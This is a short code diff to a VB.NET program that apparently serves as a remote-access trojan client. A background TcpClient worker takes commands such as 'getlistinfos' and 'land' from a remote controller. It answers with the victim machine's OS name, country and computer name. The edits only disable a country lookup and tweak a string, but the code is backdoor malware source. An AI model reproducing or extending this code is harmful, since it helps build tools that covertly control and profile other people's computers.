@@ -3,11 +3,11 @@ Imports System.IO
 
 Public Class Form1
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        land = GetLand()
+        'land = GetLand()
         BackgroundWorker1.RunWorkerAsync()
     End Sub
     Public ip As String
-    Public land As String = "nothing"
+    Public land As String = "Working"
     Dim proc As New Process
     Dim cmd_client As TcpClient
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
@@ -25,7 +25,7 @@ Public Class Form1
                             w.Flush()
                         ElseIf s = "getlistinfos" Then
                             Threading.Thread.Sleep(500)
-                            w.WriteLine(c(My.Computer.Info.OSFullName) & "|" & c(land) & "|" & c(My.Computer.Name))
+                            w.WriteLine(c(My.Computer.Info.OSFullName) & "|" & c(land) & "|" & c(My.Computer.Name.ToString()))
                             w.Flush()
                         ElseIf s = "land" Then
                             Threading.Thread.Sleep(500)
